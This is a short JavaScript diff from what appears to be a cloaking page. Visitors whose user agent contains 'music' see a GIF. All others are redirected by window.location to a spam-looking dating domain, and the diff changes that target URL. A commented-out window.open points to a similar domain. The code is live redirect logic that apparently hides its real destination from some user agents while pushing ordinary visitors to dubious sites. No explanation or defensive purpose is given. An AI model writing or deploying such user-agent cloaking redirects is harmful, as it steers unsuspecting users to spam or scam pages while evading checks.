@@ -12,7 +12,7 @@ if (agent.indexOf('music') >= 0) {
   gif.className = 'block';
   gif_desc.className = 'block';
 } else {
-  window.location = 'https://h2x7a.nl/og.php?u=/cl/i/ndmj1v';
+  window.location = 'https://r3n2br5.theyoursweetflirt.com/y7a86zh';
 //   window.open('https://phf2hrh.easy-lovezone.com/e64gxw7', '_blank');
   console.log('go to link');
 
